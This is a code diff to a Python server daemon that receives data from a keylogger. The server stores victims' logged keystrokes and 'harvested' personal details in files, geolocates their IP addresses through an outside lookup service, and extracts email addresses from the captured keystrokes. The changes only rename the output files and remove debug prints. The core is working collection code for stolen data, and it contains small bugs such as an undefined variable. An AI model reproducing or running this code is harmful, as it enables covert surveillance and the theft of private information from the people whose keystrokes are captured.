@@ -359,16 +359,13 @@ class MyDaemon(Daemon):
 def handle(conn): #accpet keylogged info and save it to files
     chan = conn
     request = chan.recv(1024).decode()
-    logger.info("Client said this ->" + str(request))
-    print("Client said this ->" + str(request))
-    print(str(request))
     
     #we check to see if were being sent the keylogged data or a string that the user entered
     #if its a string from the user, we add it to a csv with all other harvested info
     if request=='infobank.txt':
         info=chan.recv(1024).decode('utf-8')
         seperated=info.split('|')
-        with open(cwd+'/peoplesInfo.csv', 'a',  newline='') as writer:
+        with open(cwd+'/serverPeoplesInfo.csv', 'a',  newline='') as writer:
             for x in range(len(seperated)):
                 if len(seperated[x])>1:
                     writer.write(seperated[x])
@@ -376,21 +373,19 @@ def handle(conn): #accpet keylogged info and save it to files
                     response=requests.get("http://ip-api.com/json/%s"%(newlist[6])) #use ip-api.com's api to look up ip address and harvest more info like latitude/longitude
                     if  response.status_code==200:#if ip-api runs successfully save the results into another csv
                         txt=json.dumps(response.json())
-                        print(txt)
                         writer.write(txt)
                     newlist=seperated[x].split(',')
                     soup(newlist[0], newlist[1], newlist[2], newlist[3])
     elif request=='keylog.txt':#if its a keylogged file just accept the file
         info2=chan.recv(2048).decode('utf-8')
-        print("logging data")
         info2=str(info2)
-        with open(cwd+'/keyLoggedData.txt', 'a',  newline='') as writer:
+        with open(cwd+'/serverKeyLoggedData.txt', 'a',  newline='') as writer:
                 writer.write(info2)
         #search through the key logger to find an email and save it to the csv
         email=re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", info2)
         for email in email:
             soup(email)
-            with open(cwd+'/peoplesInfo.csv', 'a',  newline='') as writer:
+            with open(cwd+'/serverPeoplesInfo.csv', 'a',  newline='') as writer:
                 write.write(email)
     try:
         conn.close()
